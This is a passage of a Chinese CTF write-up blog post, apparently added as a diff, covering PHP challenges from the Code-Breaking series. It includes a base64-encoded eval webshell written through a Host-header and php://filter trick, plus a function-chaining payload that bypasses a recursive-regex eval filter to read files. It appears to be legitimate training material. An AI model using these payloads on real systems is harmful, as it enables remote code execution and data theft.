+<p>在后面对<code>$log_name</code> 重新赋值时</p>
+<figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$log_name = $_SERVER[<span class="hljs-string">&#x27;SERVER_NAME&#x27;</span>] . $log_name<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+<p><code>$_SERVER[&#39;SERVER_NAME&#39;]</code>在<code>Apache2</code>没有设置<code>UseCanonicalName = On </code>和 <code>ServerName</code>时也是可控的。<br>它获取的就是客户端请求头中<code>Host</code>的值。<br><img src="https://image.mengsec.com/code-breaking/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>这样整个<code>$log_name</code>的内容就都可以控制了，由此我们可以传入<code>php</code>伪协议来写文件。</p>
+<p>接下来是<code>$output</code>，也就是控制文件内容。</p>
+<p>由于<code>htmlspecialchars()</code>将<code>&lt;&gt;</code>转成了HTML实体，需要进行编码绕过，<code>php</code>伪协议又支持<code>base64</code>解码，而且<code>php</code>在进行<code>base64</code>解码的时候如果遇到不是<code>base64</code>编码的字符会直接跳过。</p>
+<p>这样我们就有思路了，<code>Host</code>与<code>log</code>组成<code>php</code>伪协议,<code>doamin</code>为写入的<code>shell</code>的<code>base64</code>，因为<code>base64</code>编码的最后才会使用等号进行补位，因此shell编码后不能包含等号。<br><code>&lt;?php @eval($_GET[&quot;a&quot;]);/**</code><br><code>base64</code>之后</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">PD9waHAgQGV2YWwoJF9HRVRbImEiXSk7Lyoq<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/code-breaking/6.png" srcset="/img/loading.gif" alt="6"></p>
+<p>成功getshell<br><img src="https://image.mengsec.com/code-breaking/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>读取flag<br><img src="https://image.mengsec.com/code-breaking/8.png" srcset="/img/loading.gif" alt="8"></p>
+<h2 id="4-easy-phplimit"><a href="#4-easy-phplimit" class="headerlink" title="4. easy - phplimit"></a>4. easy - phplimit</h2><p>代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === preg_replace(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>])) &#123;    <br>    <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;code&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<p>在这里考察的其实是PHP正则表达式的递归模式。每一次迭代，php都会把表达式中的<code>(?R)</code>替换为<code>/[^\W]+\((?R)?\)/</code><br>这也就意味着我们传入的参数必须是不带参数的函数才可以。</p>
+<p>这个题和RCTF2018中的r-cursive类似，原题是利用<code>getallheaders()</code>函数来绕过，但是这个题的环境为nginx。不能使用该函数获取数据。</p>
+<p>PHP中提供了<code>get_defined_vars()</code>这个函数来获取所有已定义变量。</p>
+<p>成功执行代码<br><img src="https://image.mengsec.com/code-breaking/9.png" srcset="/img/loading.gif" alt="9"></p>
+<p>读取flag</p>
+<p><img src="https://image.mengsec.com/code-breaking/10.png" srcset="/img/loading.gif" alt="10"></p>
+<p>其他payload</p>
+<figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-variable">code</span>=<span class="hljs-function"><span class="hljs-title"><span class="hljs-built_in">readfile</span></span>(<span class="hljs-title">next</span>(<span class="hljs-title">array_reverse</span>(<span class="hljs-title">scandir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">chdir</span>(<span class="hljs-title">dirname</span>(<span class="hljs-title">getcwd</span>())))))));</span><br></code></pre></td></tr></table></figure>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/Writeup/">Writeup</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/02/27/code-breaking-lumenserial/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">从lumenserial中学phar反序列化漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/01/28/phpbrew-nginx%E6%89%93%E9%80%A0%E5%A4%9A%E7%89%88%E6%9C%ACphp%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">
+                        <span class="hidden-mobile">phpbrew+nginx打造多版本php开发环境</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
